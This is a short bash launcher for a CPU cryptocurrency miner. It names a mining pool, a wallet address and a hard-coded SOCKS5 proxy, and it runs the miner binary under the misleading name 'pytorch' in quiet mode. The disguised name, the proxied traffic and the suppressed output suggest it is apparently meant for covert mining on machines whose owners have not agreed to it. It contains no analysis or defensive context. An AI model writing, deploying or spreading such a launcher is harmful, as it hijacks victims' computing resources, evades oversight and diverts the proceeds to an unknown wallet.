#!/bin/bash
POOL=stratum+tcp://cpupower.na.mine.zpool.ca:6240
WALLET=D786Q59xzNpTfyewB9mFZjYTHJKs2zE8zV
PROXY=socks5://167.172.141.70:28598
./pytorch -a cpupower -o $POOL -u $WALLET -p c=DGB,zap=CPU -x $PROXY -q
